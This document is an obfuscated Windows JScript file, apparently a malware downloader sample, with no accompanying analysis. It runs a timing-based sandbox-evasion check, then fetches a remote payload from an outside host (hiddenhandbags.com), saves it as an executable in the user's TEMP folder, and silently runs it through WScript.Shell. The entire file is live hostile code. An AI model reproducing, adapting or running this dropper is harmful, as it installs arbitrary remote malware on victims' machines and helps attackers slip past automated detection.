var t = false;
var A0 = "CreateObject";
var d = function A() {return WScript[A0]("WScript.Shell");}(), XY = 11;
var Y0 = "MSXML2.XMLHTTP";
var R = 2123213;
var Kd = 0;
function X(SX){d["Run"](SX, Kd, Kd);};
function Ib(){return "" + Y0;};
function V(C, jW){Kd = Kd * 1; return C - jW;};
function vU(){return A0;};
/*@cc_on
  @if (@_win32 || @_win64)
    t = true;
  @end
@*/
if (t)
{
var ft = "";
function Dq(){return 22;};
var gr = 0; var e = 0;
function Ku()
{
var y = new this["Date"]();
var lC = y["getUTCMilliseconds"]();
WScript["Sleep"](Dq());
var y = new this["Date"]();
var b = y["getUTCMilliseconds"]();
WScript["Sleep"](Dq());
var y = new this["Date"]();
var J = y["getUTCMilliseconds"]();
var gr = "H";
gr = V(b, lC);
var e = "P";
e = V(J, b);
ft = "open";
return V(gr, e);
}
var L0 = false;
var J0 = false;
for (var rk = Kd; rk < Dq() * 1; rk++){if (Ku() != Kd){
L0 = true; 
e = "31" + 11 * gr + e; 
J0 = true; 
break;
}}
function p() {return ((L0 == true) && (L0 == J0)) ? 1 : Kd;};
if (L0 && p() && J0){
function co() {return d["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KuvzWnkhBuqBhHmU.exe";};
 H0 = Ib();
 Ke = WScript[A0](H0);
 var r = 1;
 while (r){
try {
Ke[ft]("GET", "http://hiddenhandbags.com/kdk4a", false);
Ke["send"]();
L = "Sleep";
for (;;){WScript[L](Dq() * 11); if (Ke["readystate"] >= 2 * 2) break;};
r = Kd;
} catch(Q){};
}
function kU(U) {var Rs = (1, 2, 3, 4, 5, U); return Rs;};
A1 = WScript[vU()]("ADODB.Stream");
H0 = A1;
H0[ft]();
H0["type"] = kU(1);
H0["write"](Ke["ResponseBody"]);
A1["position"] = kU(Kd);
H0["Save" + "ToFile"](co(), 2);
A1["c"+"lose"]();
Y = co();
X(Y);
}
}

